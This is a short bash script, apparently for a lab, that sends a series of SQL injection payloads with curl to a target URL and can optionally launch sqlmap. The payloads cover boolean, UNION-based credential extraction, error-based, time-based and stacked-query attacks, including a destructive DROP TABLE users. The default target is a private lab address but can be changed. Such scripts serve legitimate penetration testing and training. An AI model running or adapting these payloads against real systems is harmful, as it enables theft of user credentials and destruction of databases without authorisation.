#!/usr/bin/env bash
set -euo pipefail

TARGET="${TARGET:-https://192.168.56.20}"

echo "[*] Starting SQL Injection attack suite against $TARGET"

PAYLOADS=(
  # 1. Boolean-based
  "/?id=1%27%20OR%20%271%27=%271"
  # 2. UNION-based
  "/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--"
  # 3. Error-based
  "/?id=1%27%20AND%20extractvalue(1,concat(0x7e,database()))--"
  # 4. Time-based
  "/?id=1%27%20AND%20SLEEP(5)--"
  # 5. Stacked queries
  "/?id=1%27;%20DROP%20TABLE%20users--"
)

for p in "${PAYLOADS[@]}"; do
  echo "[+] Sending payload: $p"
  # Используем -k, так как у нас самоподписанный сертификат
  curl -k -s -o /dev/null -w "HTTP Status: %{http_code}\n" "$TARGET$p"
  sleep 1
done

if [[ "${1:-}" == "--sqlmap" ]]; then
  echo "[*] Running automated sqlmap scan..."
  # sqlmap не любит самоподписанные сертификаты, поэтому используем флаг --force-ssl
  sqlmap -u "$TARGET/?id=1" --batch --level=1 --risk=1 --force-ssl --output-dir=reports/sqlmap/ || true
fi

echo "[+] Attack suite finished."
